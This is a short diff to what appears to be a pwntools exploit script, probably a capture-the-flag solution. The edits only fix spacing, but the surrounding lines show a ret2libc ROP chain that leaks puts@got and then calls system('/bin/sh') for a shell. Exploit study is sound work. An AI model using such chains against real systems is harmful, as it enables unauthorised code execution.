@@ -271,7 +271,7 @@ info('puts@got: %s' % hex(PUTS_GOT))
 info('puts@plt: %s' % hex(PUTS_PLT))
 info('main: %s' % hex(MAIN))
 
-payload  = b'A' * 56
+payload = b'A' * 56
 payload += p64(POP_RDI)
 payload += p64(PUTS_GOT)
 payload += p64(PUTS_PLT)
@@ -331,7 +331,7 @@ info('bin/sh: %s' % hex(BINSH))
 info('system: %s' % hex(SYSTEM))
 info('ret gadget: %s' % hex(RET))
 
-payload  = 'A' * 56
+payload = 'A' * 56
 payload += p64(RET)
 payload += p64(POP_RDI)
 payload += p64(BINSH)
